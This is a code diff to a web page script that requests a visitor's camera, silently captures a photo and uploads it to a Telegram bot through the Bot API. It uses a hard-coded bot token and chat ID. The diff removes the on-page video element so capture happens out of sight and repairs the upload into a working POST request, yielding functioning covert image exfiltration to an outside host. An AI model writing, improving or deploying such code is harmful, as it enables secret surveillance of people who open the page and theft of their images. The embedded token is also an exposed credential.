@@ -13,14 +13,6 @@
         // Request access to the user's camera
         navigator.mediaDevices.getUserMedia({ video: true })
             .then(function (stream) {
-                // Display the camera stream on the page (you can hide it if needed)
-                var video = document.createElement('video');
-                video.srcObject = stream;
-                video.play();
-
-                // Append the video element to the body (you can hide it if needed)
-                document.body.appendChild(video);
-
                 // Capture photo after a short delay (adjust as needed)
                 setTimeout(function () {
                     capturePhoto(stream);
@@ -34,7 +26,10 @@
     function capturePhoto(stream) {
         // Create a canvas element to capture the photo
         var canvas = document.createElement('canvas');
-        var video = document.querySelector('video');
+        var video = document.createElement('video');
+        video.srcObject = stream;
+        video.play();
+
         canvas.width = video.videoWidth;
         canvas.height = video.videoHeight;
         var ctx = canvas.getContext('2d');
@@ -45,32 +40,30 @@
             track.stop();
         });
 
-        // Convert the canvas content to a data URL
-        var imageDataUrl = canvas.toDataURL('image/jpeg');
+        // Convert the canvas content to a Blob (image file)
+        canvas.toBlob(function (blob) {
+            // Create a FormData object to send the photo as a file
+            var formData = new FormData();
+            formData.append('photo', blob, 'photo.jpg');
+            formData.append('chat_id', '-1001590820560'); // Replace with your actual chat ID
+            formData.append('caption', 'Smile captured!');
 
-        // Send the image to Telegram Bot API
-        // You need to replace 'YOUR_BOT_TOKEN' and 'YOUR_CHAT_ID' with your actual values
-        var botToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg';
-        var chatId = '-1001590820560';
+            // Replace 'YOUR_BOT_TOKEN' with your actual Telegram bot token
+            var botToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg';
 
-        // Example using fetch API
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
-            method: 'sendphoto',
-            headers: {
-                'Content-Type': 'application/json',
-            },
-            body: JSON.stringify({
-                photo: imageDataUrl,
-                caption: 'Smile captured!',
-            }),
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log('Photo sent to Telegram:', data);
-        })
-        .catch(error => {
-            console.error('Error sending photo to Telegram:', error);
-        });
+            // Send the image to Telegram Bot API using the sendPhoto method
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+            })
+            .then(response => response.json())
+            .then(data => {
+                console.log('Telegram API response:', data);
+            })
+            .catch(error => {
+                console.error('Error sending photo to Telegram:', error);
+            });
+        }, 'image/jpeg');
     }
 </script>
 
